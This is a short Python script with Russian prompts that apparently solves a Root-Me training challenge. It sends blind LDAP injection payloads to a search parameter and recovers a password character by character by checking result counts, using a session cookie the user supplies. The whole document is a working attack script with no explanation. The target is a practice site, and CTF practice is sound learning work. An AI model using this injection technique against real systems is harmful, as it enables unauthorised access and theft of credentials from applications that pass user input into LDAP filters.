import requests
page = "http://challenge01.root-me.org//web-serveur/ch26/?action=dir&search="
input_cookie = input("Введите свою куку:")
cook = {'challenge_frame' : '1','spip_session' : input_cookie }
charset = "0123456789abcdefghijklmnopqrstuvwxyz"
passwd=""
continuer=True
i=0
while continuer:
  while i < len(charset):
    req=page+"ad*)(password="+passwd+charset[i]+"*))%00"
    res = requests.get(req,cookies=cook)
    if "0 results" in res.text:
      i+=1
    else:
      passwd+=charset[i]
      i=0
      print (passwd)
      break
    req=page+"ad*)(password="+passwd+charset[i]+"))%00"
    res = requests.get(req,cookies=cook)
    if "1 results" in res.text:
      continuer=False
    else:
      break
print ("\n Пароль : "+passwd)